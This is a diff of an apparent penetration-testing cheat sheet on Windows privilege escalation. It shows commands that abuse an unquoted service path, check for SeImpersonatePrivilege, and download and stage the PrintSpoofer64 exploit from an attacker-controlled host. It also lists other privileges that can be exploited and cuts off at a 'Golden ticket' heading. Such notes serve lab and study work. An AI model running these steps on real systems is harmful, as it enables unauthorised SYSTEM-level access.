@@ -83,19 +83,22 @@ Write-ServiceBinary -Name '$SERVICE' -Path "C:\$UNQUOTED_PATH"
 Restart-Service $SERVICE
 ```
 
-Abusing SeImpersonatePrivilege with PrinterSpoofer64:
+Abusing enabled SeImpersonatePrivilege with PrinterSpoofer64:
 
 ```powershell
-whoami /priv
-# look for SeImpersonatePrivilege = enabled
-iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+whoami /priv | select-string "SeImpersonatePrivilege(.*)Enabled"
+iwr -uri http://$LOCAL_IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 ```
 
 ```bash
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 python3 -m http.server 80
 ```
-Golden ticket:
+
+Other privileges that can be exploited if enabled: 
+`SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebug`
+
+Golden ticket
 ---
 generate user password hash:
 
